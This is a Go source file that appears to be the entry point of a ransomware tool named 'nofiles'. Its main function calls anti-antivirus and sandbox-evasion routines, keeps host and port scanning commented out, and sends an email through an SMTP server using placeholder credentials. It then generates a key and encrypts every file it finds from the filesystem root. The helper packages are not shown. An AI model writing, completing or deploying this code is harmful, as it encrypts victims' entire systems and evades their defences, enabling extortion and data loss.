package main

import (
	"nofiles/antiav"
	"nofiles/mail"
	"nofiles/files"
	"nofiles/encrypt"

	"log"
)


func main() {
	antiav.Sandbox()
	err := antiav.Before()
	if err != nil {
		log.Println("Preparation failed:", err)
	}

//	ips, err := antiav.Hosts()
//	if err != nil {
//		log.Println("Scanning failed:", err)
//	}
//	ports := antiav.Ports(ips)

	email := &mail.Email{
		From:       "user@example.org",
		Password:   "example",
		ServerHost: "example.org",
		ServerPort: "587",
		To:         []string{"recepient@example.com"},
		Subject:    "Test Email",
		Body:       "This is a test email.",
	}
	err = email.Send()
	if err != nil {
		log.Println("Cannot send email:", err)
	}

	key := encrypt.GenerateKey()

	files := files.Files("/")
	for _, file := range files {
		encrypt.Encrypt(key, file)
	}

	err = antiav.After()
	if err != nil {
		log.Println("Finishing failed:", err)
	}
}
